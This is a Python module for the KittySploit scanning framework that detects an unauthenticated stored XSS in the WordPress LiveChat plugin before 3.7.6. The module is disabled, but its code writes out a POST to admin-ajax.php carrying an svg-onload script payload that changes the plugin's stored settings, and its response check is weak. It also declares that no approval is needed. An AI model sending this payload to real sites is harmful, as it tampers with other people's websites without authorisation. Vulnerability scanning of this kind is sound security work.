#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress LiveChat plugin before < 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress LiveChat < 3.7.6 - Unauthenticated Stored XSS Detection',
        'description': 'WordPress LiveChat plugin before < 3.7.6 lacked CSRF and authorization checks on the option update handler in the LiveChatAdmin constructor. The code ran on any POST to a wp-admin URL without Referer validation, nonce check, or capability verification. This allowed unauthenticated attackers to update plugin settings.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'wpscan', 'wp', 'wp-plugin', 'wordpress', 'livechat', 'xss', 'stored-xss', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/plugin/wp-live-chat-software-for-wordpress/',
            'https://wordpress.org/plugins/wp-live-chat-software-for-wordpress',
        ],
    }

    def run(self):
        return False  # disabled: corrupted matchers
        path = '/wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='licenseNumber=42&licenseEmail=%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E\n')
        if not r or r.status_code not in (200, 400):
            return False
        body = r.text or ""
        body_any = ('0',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='WordPress LiveChat < 3.7.6 - Unauthenticated Stored XSS detected', path=path)
            return True
        return False

